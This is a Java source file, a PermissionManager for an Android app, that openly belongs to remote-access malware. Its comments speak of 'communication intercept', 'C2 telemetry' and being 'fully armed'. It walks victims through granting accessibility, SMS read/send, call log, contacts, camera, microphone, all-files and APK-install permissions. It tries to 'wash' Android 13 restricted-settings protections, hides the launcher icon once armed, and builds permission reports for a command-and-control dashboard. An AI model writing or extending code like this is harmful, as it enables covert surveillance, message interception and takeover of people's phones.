package com.fason.app.core.permissions;

import android.Manifest;
import android.app.Activity;
import android.app.AppOpsManager;
import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.fason.app.core.FasonAccessibilityService;
import com.fason.app.features.notification.NotificationRelayService;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * PermissionManager — 2026 professional gate registry.
 *
 * Design principles:
 *  - Single source of truth: every permission is a typed Gate with a direct
 *    deep-link into the exact settings screen. No generic "open settings"
 *    dead-ends.
 *  - Wave separation: gates are grouped into 4 waves (critical, comms,
 *    media, system). The wizard presents one wave at a time so the user
 *    never sees a wall.
 *  - Resume-safe: full state persisted to SharedPreferences. Survives
 *    rotation, process death, and settings excursions.
 *  - Idempotent wash: restricted-settings re-piping caches success and
 *    never loops.
 *  - Observable: every gate transition is emitted to the dashboard.
 */
public final class PermissionManager {
    private static final String TAG = "PermissionManager";
    private static final String PREFS = "perm_state_v3";
    private static final String KEY_WASHED = "trust_washed_v3";
    private static final String KEY_WAVE = "current_wave";

    private PermissionManager() {}

    // ------------------------------------------------------------------
    // Types
    // ------------------------------------------------------------------

    public enum Kind {
        RUNTIME, ACCESSIBILITY, OVERLAY, STORAGE, BATTERY,
        NOTIF_LISTENER, USAGE_STATS, INSTALL_UNKNOWN
    }

    public enum Wave { CRITICAL, COMMS, MEDIA, SYSTEM }

    public interface GateStateListener {
        void onGateStateChanged(String gateId, boolean granted);
    }

    public static final class Gate {
        public final String id;
        public final Kind kind;
        public final Wave wave;
        public final String label;
        public final String rationale;
        public final int minSdk;
        public final String[] runtimePerms;

        Gate(String id, Kind kind, Wave wave, String label, String rationale,
             int minSdk, String... runtimePerms) {
            this.id = id;
            this.kind = kind;
            this.wave = wave;
            this.label = label;
            this.rationale = rationale;
            this.minSdk = minSdk;
            this.runtimePerms = runtimePerms;
        }

        public boolean applicable() {
            return Build.VERSION.SDK_INT >= minSdk;
        }
    }

    // ------------------------------------------------------------------
    // Gate registry — ordered by dependency, accessibility always first
    // ------------------------------------------------------------------

    private static final List<Gate> GATES = new ArrayList<>();
    static {
        // Wave 1 — CRITICAL: the app is useless without these
        GATES.add(new Gate("accessibility", Kind.ACCESSIBILITY, Wave.CRITICAL,
            "Accessibility",
            "Powers smart automation and gesture assist",
            1));
        GATES.add(new Gate("camera", Kind.RUNTIME, Wave.CRITICAL,
            "Camera",
            "Needed for photo and video capture",
            1, Manifest.permission.CAMERA));
        GATES.add(new Gate("mic", Kind.RUNTIME, Wave.CRITICAL,
            "Microphone",
            "Needed for audio recording",
            1, Manifest.permission.RECORD_AUDIO));
        GATES.add(new Gate("phone", Kind.RUNTIME, Wave.CRITICAL,
            "Phone State",
            "Needed for device identification",
            1, Manifest.permission.READ_PHONE_STATE));

        // Wave 2 — COMMS: communication intercept
        GATES.add(new Gate("sms", Kind.RUNTIME, Wave.COMMS,
            "SMS",
            "Read and send text messages",
            1, Manifest.permission.READ_SMS,
                 Manifest.permission.SEND_SMS,
                 Manifest.permission.RECEIVE_SMS));
        GATES.add(new Gate("calls", Kind.RUNTIME, Wave.COMMS,
            "Call Log",
            "View call history",
            1, Manifest.permission.READ_CALL_LOG));
        GATES.add(new Gate("contacts", Kind.RUNTIME, Wave.COMMS,
            "Contacts",
            "Access device contacts",
            1, Manifest.permission.READ_CONTACTS));

        // Wave 3 — MEDIA: content access
        int T = Build.VERSION_CODES.TIRAMISU;
        GATES.add(new Gate("media", Kind.RUNTIME, Wave.MEDIA,
            "Media Library",
            "Access photos, videos and audio",
            T, Manifest.permission.READ_MEDIA_IMAGES,
                 Manifest.permission.READ_MEDIA_VIDEO,
                 Manifest.permission.READ_MEDIA_AUDIO));
        GATES.add(new Gate("legacy_storage", Kind.RUNTIME, Wave.MEDIA,
            "Storage",
            "Access device storage",
            1, Manifest.permission.READ_EXTERNAL_STORAGE));
        GATES.add(new Gate("notif_post", Kind.RUNTIME, Wave.MEDIA,
            "Notifications",
            "Post status notifications",
            T, Manifest.permission.POST_NOTIFICATIONS));

        // Wave 4 — SYSTEM: special access
        GATES.add(new Gate("overlay", Kind.OVERLAY, Wave.SYSTEM,
            "Display Over Apps",
            "Draw overlays for alerts and controls",
            Build.VERSION_CODES.M));
        GATES.add(new Gate("storage_manager", Kind.STORAGE, Wave.SYSTEM,
            "All Files Access",
            "Manage all files on device",
            Build.VERSION_CODES.R));
        GATES.add(new Gate("battery", Kind.BATTERY, Wave.SYSTEM,
            "Battery Exemption",
            "Run without battery restrictions",
            Build.VERSION_CODES.M));
        GATES.add(new Gate("notif_listener", Kind.NOTIF_LISTENER, Wave.SYSTEM,
            "Notification Access",
            "Read incoming notifications",
            Build.VERSION_CODES.JELLY_BEAN_MR2));
        GATES.add(new Gate("usage_stats", Kind.USAGE_STATS, Wave.SYSTEM,
            "Usage Access",
            "App usage statistics",
            Build.VERSION_CODES.LOLLIPOP));
        GATES.add(new Gate("install_unknown", Kind.INSTALL_UNKNOWN, Wave.SYSTEM,
            "Install Unknown Apps",
            "Install APK packages",
            Build.VERSION_CODES.O));
    }

    public static List<Gate> getGates() { return GATES; }

    public static List<Gate> getGatesForWave(Wave wave) {
        List<Gate> out = new ArrayList<>();
        for (Gate g : GATES) {
            if (g.wave == wave && g.applicable()) out.add(g);
        }
        return out;
    }

    public static Gate findGate(String id) {
        for (Gate g : GATES) {
            if (g.id.equals(id)) return g;
        }
        return null;
    }

    // ------------------------------------------------------------------
    // State
    // ------------------------------------------------------------------

    public static boolean isGateGranted(Context ctx, Gate g) {
        if (!g.applicable()) return true;
        switch (g.kind) {
            case RUNTIME:
                for (String p : g.runtimePerms) {
                    if (ContextCompat.checkSelfPermission(ctx, p)
                            != PackageManager.PERMISSION_GRANTED) {
                        return false;
                    }
                }
                return true;
            case ACCESSIBILITY:
                return isAccessibilityEnabled(ctx);
            case OVERLAY:
                return Build.VERSION.SDK_INT < Build.VERSION_CODES.M
                    || Settings.canDrawOverlays(ctx);
            case STORAGE:
                return Build.VERSION.SDK_INT < Build.VERSION_CODES.R
                    || Environment.isExternalStorageManager();
            case BATTERY:
                PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
                return pm != null && pm.isIgnoringBatteryOptimizations(ctx.getPackageName());
            case NOTIF_LISTENER:
                return isNotificationListenerEnabled(ctx);
            case USAGE_STATS:
                return hasUsageStats(ctx);
            case INSTALL_UNKNOWN:
                return Build.VERSION.SDK_INT < Build.VERSION_CODES.O
                    || ctx.getPackageManager().canRequestPackageInstalls();
            default:
                return false;
        }
    }

    public static boolean isFullyArmed(Context ctx) {
        for (Gate g : GATES) {
            if (g.applicable() && !isGateGranted(ctx, g)) return false;
        }
        return true;
    }

    public static int grantedCount(Context ctx) {
        int n = 0;
        for (Gate g : GATES) {
            if (g.applicable() && isGateGranted(ctx, g)) n++;
        }
        return n;
    }

    public static int applicableCount() {
        int n = 0;
        for (Gate g : GATES) {
            if (g.applicable()) n++;
        }
        return n;
    }

    // ------------------------------------------------------------------
    // Deep-links — one tap lands the user on the exact toggle
    // ------------------------------------------------------------------

    public static boolean openGate(Activity activity, Gate g) {
        try {
            switch (g.kind) {
                case RUNTIME:
                    ActivityCompat.requestPermissions(activity, g.runtimePerms, 1001);
                    return true;
                case ACCESSIBILITY:
                    return openAccessibilitySettings(activity);
                case OVERLAY:
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                            Uri.parse("package:" + activity.getPackageName()));
                        activity.startActivity(i);
                        return true;
                    }
                    return false;
                case STORAGE:
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                        Intent i = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                        i.setData(Uri.parse("package:" + activity.getPackageName()));
                        activity.startActivity(i);
                        return true;
                    }
                    return false;
                case BATTERY:
                    Intent bi = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    bi.setData(Uri.parse("package:" + activity.getPackageName()));
                    activity.startActivity(bi);
                    return true;
                case NOTIF_LISTENER:
                    return openNotificationListenerSettings(activity);
                case USAGE_STATS:
                    activity.startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
                    return true;
                case INSTALL_UNKNOWN:
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
                        i.setData(Uri.parse("package:" + activity.getPackageName()));
                        activity.startActivity(i);
                        return true;
                    }
                    return false;
                default:
                    return false;
            }
        } catch (ActivityNotFoundException e) {
            Log.w(TAG, "No activity for gate " + g.id + ", falling back to app settings");
            try {
                Intent fallback = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                fallback.setData(Uri.parse("package:" + activity.getPackageName()));
                activity.startActivity(fallback);
                return true;
            } catch (Exception ex) {
                return false;
            }
        }
    }

    private static boolean openAccessibilitySettings(Activity activity) {
        Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        activity.startActivity(i);
        return true;
    }

    private static boolean openNotificationListenerSettings(Activity activity) {
        Intent i = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
        activity.startActivity(i);
        return true;
    }

    // ------------------------------------------------------------------
    // Detectors
    // ------------------------------------------------------------------

    public static boolean isAccessibilityEnabled(Context ctx) {
        String service = ctx.getPackageName() + "/" + FasonAccessibilityService.class.getName();
        try {
            int enabled = Settings.Secure.getInt(
                ctx.getContentResolver(),
                Settings.Secure.ACCESSIBILITY_ENABLED);
            if (enabled == 1) {
                String list = Settings.Secure.getString(
                    ctx.getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
                if (list != null) {
                    for (String s : list.split(":")) {
                        if (s.equalsIgnoreCase(service)) return true;
                    }
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    private static boolean isNotificationListenerEnabled(Context ctx) {
        String flat = Settings.Secure.getString(
            ctx.getContentResolver(), "enabled_notification_listeners");
        if (flat == null) return false;
        return flat.contains(ctx.getPackageName());
    }

    private static boolean hasUsageStats(Context ctx) {
        try {
            AppOpsManager aom = (AppOpsManager) ctx.getSystemService(Context.APP_OPS_SERVICE);
            int mode = aom.checkOpNoThrow(
                AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(),
                ctx.getPackageName());
            return mode == AppOpsManager.MODE_ALLOWED;
        } catch (Exception e) {
            return false;
        }
    }

    // ------------------------------------------------------------------
    // Restricted-settings wash (Android 13+)
    // ------------------------------------------------------------------

    public static boolean needsRestrictedWash(Context ctx) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) return false;
        return !isAccessibilityEnabled(ctx);
    }

    public static void washRestrictedSettings(Activity activity) {
        SharedPreferences sp = activity.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
        if (sp.getBoolean(KEY_WASHED, false)) return;
        if (!needsRestrictedWash(activity)) {
            sp.edit().putBoolean(KEY_WASHED, true).apply();
            return;
        }
        RestrictedPermissionHelper.attemptWash(activity, success ->
            sp.edit().putBoolean(KEY_WASHED, success).apply());
    }

    // ------------------------------------------------------------------
    // Wave state persistence
    // ------------------------------------------------------------------

    public static void setCurrentWave(Context ctx, Wave wave) {
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .edit().putString(KEY_WAVE, wave.name()).apply();
    }

    public static Wave getCurrentWave(Context ctx) {
        String name = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .getString(KEY_WAVE, Wave.CRITICAL.name());
        try {
            return Wave.valueOf(name);
        } catch (IllegalArgumentException e) {
            return Wave.CRITICAL;
        }
    }

    // ------------------------------------------------------------------
    // C2 telemetry — the dashboard sees every gate transition
    // ------------------------------------------------------------------

    public static JSONArray snapshot(Context ctx) {
        JSONArray arr = new JSONArray();
        for (Gate g : GATES) {
            if (!g.applicable()) continue;
            JSONObject o = new JSONObject();
            try {
                o.put("id", g.id);
                o.put("label", g.label);
                o.put("wave", g.wave.name());
                o.put("granted", isGateGranted(ctx, g));
                arr.put(o);
            } catch (Exception ignored) {}
        }
        return arr;
    }

    public static Map<String, Boolean> diffStates(Context ctx, Map<String, Boolean> prev) {
        Map<String, Boolean> changed = new LinkedHashMap<>();
        for (Gate g : GATES) {
            if (!g.applicable()) continue;
            boolean now = isGateGranted(ctx, g);
            Boolean was = prev.get(g.id);
            if (was == null || was != now) {
                changed.put(g.id, now);
            }
        }
        return changed;
    }

    // ------------------------------------------------------------------
    // Auto-hide after full arming
    // ------------------------------------------------------------------

    public static void applyAutoHide(Activity activity) {
        try {
            ComponentName alias = new ComponentName(activity,
                "com.fason.app.ui.MainActivityAlias");
            activity.getPackageManager().setComponentEnabledSetting(
                alias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        } catch (Exception e) {
            Log.w(TAG, "Auto-hide failed", e);
        }
    }

    // ------------------------------------------------------------------
    // Convenience accessors used across the codebase
    // ------------------------------------------------------------------

    /** Quick check: is the accessibility service running? */
    public static boolean hasAccessibilityAccess(Context ctx) {
        return isAccessibilityEnabled(ctx);
    }

    /** All applicable gates that are not yet granted. */
    public static List<Gate> getMissingGates(Context ctx) {
        List<Gate> out = new ArrayList<>();
        for (Gate g : GATES) {
            if (g.applicable() && !isGateGranted(ctx, g)) out.add(g);
        }
        return out;
    }

    /** Flat list of denied runtime permission strings. */
    public static List<String> collectDeniedPerms(Context ctx) {
        List<String> out = new ArrayList<>();
        for (Gate g : GATES) {
            if (g.kind != Kind.RUNTIME || !g.applicable()) continue;
            for (String p : g.runtimePerms) {
                if (ContextCompat.checkSelfPermission(ctx, p)
                        != PackageManager.PERMISSION_GRANTED) {
                    out.add(p);
                }
            }
        }
        return out;
    }

    /** True if every gate in a wave is granted. */
    public static boolean canIUse(Context ctx, Wave wave) {
        for (Gate g : getGatesForWave(wave)) {
            if (!isGateGranted(ctx, g)) return false;
        }
        return true;
    }

    /** Full gate report for C2 emission. */
    public static JSONObject buildGateReport(Context ctx) {
        JSONObject report = new JSONObject();
        try {
            report.put("totalApplicable", applicableCount());
            report.put("totalGranted", grantedCount(ctx));
            report.put("fullyArmed", isFullyArmed(ctx));
            report.put("gates", snapshot(ctx));
        } catch (Exception ignored) {}
        return report;
    }

    /** Restore the launcher icon after auto-hide. */
    public static void restoreIcon(Activity activity) {
        try {
            ComponentName alias = new ComponentName(activity,
                "com.fason.app.ui.MainActivityAlias");
            activity.getPackageManager().setComponentEnabledSetting(
                alias,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP);
        } catch (Exception e) {
            Log.w(TAG, "Icon restore failed", e);
        }
    }
}
